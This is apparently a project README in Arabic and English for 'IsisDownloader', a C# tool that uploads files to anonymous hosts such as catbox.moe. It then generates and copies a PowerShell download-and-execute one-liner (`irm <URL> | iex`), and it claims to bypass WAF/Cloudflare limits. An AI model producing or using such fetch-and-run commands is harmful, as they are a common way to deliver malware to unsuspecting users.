## 🌟 نبذة عن الأداة | Overview

**IsisDownloader** هي أداة متقدمة واحترافية تم تطويرها بلغة **#C** وإطار عمل **.NET 8.0** لتوفير حل سليم وسريع لرفع أي ملف وتوليد أمر تنزيل وتشغيل تلقائي مباشر عبر **PowerShell** (`powershell "irm <URL> | iex"`).

تتميز الأداة بواجهة داكنة أنيقة (Modern Dark Theme) ونظام رفع متعدد الخوادم لضمان عدم التوقف.

---

## ✨ المميزات الرئيسية | Features

- ⚡ **رفع بضغطة زر (One-Click Upload):** رفع مباشر وسريع للملفات بدون إعدادات معقدة.
- 🛡️ **نظام رفع ثلاثي متعدد الخوادم (Multi-Server Fallback System):**
  - **السيرفر الرئيسي:** Catbox (`catbox.moe`)
  - **السيرفر الاحتياطي الأول:** Litterbox (`litterbox.catbox.moe`)
  - **السيرفر الاحتياطي الثاني:** TmpFiles (`tmpfiles.org`)
- 📋 **نسخ تلقائي للحافظة (Auto Copy to Clipboard):** يتم نسخ أمر الـ PowerShell تلقائياً إلى الحافظة فور اكتمال الرفع.
- 📜 **سجل الأوامر (Command History):** حفظ السجل الكامل للأوامر المُنشأة مع إمكانية تصديرها بضغطة زر إلى ملف نصي `IsisDownloader_Codes.txt`.
- 🎨 **واجهة أنيقة وداكنة (Modern Dark UI):** تصميم متطور ومريح للعين مع إمكانية السحب والتحكم الكامل بالنافذة.
- 🔄 **تجاوز قيود WAF / Cloudflare:** متوافقة مع أنظمة الحماية لضمان استقرار الاتصال بالـ APIs.

## 🛠️ كيفية التشغيل والبناء | Building & Running

### 1️⃣ الاستنساخ (Clone Repository)
```bash
git clone https://github.com/YourUsername/IsisDownloader.git
cd IsisDownloader
```

### 2️⃣ التشغيل المباشر (Run Project)
```bash
dotnet run --project BomberCSharp/IsisDownloader.csproj
```

### 3️⃣ بناء النسخة النهائية (Build Executable)
```bash
dotnet build BomberCSharp/IsisDownloader.csproj -c Release
```
